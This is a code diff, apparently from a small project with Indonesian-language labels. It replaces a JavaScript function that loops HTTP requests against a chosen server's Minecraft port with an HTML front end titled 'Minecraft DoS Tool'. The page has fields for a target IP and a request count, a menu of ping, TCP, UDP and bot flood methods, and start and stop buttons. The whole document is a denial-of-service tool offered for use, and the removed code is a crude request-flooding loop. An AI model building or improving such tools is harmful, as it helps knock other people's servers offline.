@@ -1,25 +1,38 @@
-function startAttack() {
-    let serverIP = document.getElementById("serverIP").value;
-    let requestCount = parseInt(document.getElementById("requestCount").value);
-    let attackMethod = document.getElementById("attackMethod").value;
-    let statusDiv = document.getElementById("status");
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft DoS Tool</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Minecraft DoS Tool</h1>
 
-    if (!serverIP || requestCount <= 0) {
-        alert("Masukkan IP yang benar dan jumlah request yang valid!");
-        return;
-    }
+        <label>Server IP:</label>
+        <input type="text" id="serverIP" placeholder="Contoh: 127.0.0.1">
 
-    statusDiv.innerHTML = "Memulai serangan ke " + serverIP + " dengan metode " + attackMethod;
+        <label>Jumlah Request:</label>
+        <input type="number" id="requestCount" placeholder="1000">
 
-    for (let i = 0; i < requestCount; i++) {
-        if (attackMethod === "ping") {
-            fetch(`http://${serverIP}:25565/ping`).catch(err => console.log("Ping failed"));
-        } else if (attackMethod === "tcp") {
-            fetch(`http://${serverIP}:25565/tcp`).catch(err => console.log("TCP failed"));
-        } else if (attackMethod === "bot") {
-            fetch(`http://${serverIP}:25565/bot`).catch(err => console.log("Bot spam failed"));
-        }
-    }
+        <label>Metode Serangan:</label>
+        <select id="attackMethod">
+            <option value="ping">Ping Flood</option>
+            <option value="tcp">TCP Flood</option>
+            <option value="udp">UDP Flood</option>
+            <option value="bot">Bot Spam</option>
+        </select>
 
-    statusDiv.innerHTML += "<br>Serangan selesai!";
-}
+        <button onclick="startAttack()">Start Attack</button>
+        <button onclick="stopAttack()">Stop Attack</button>
+
+        <div id="status">Status: Ready</div>
+
+        <canvas id="attackChart"></canvas>
+    </div>
+
+    <script src="attack.js"></script>
+</body>
+</html>
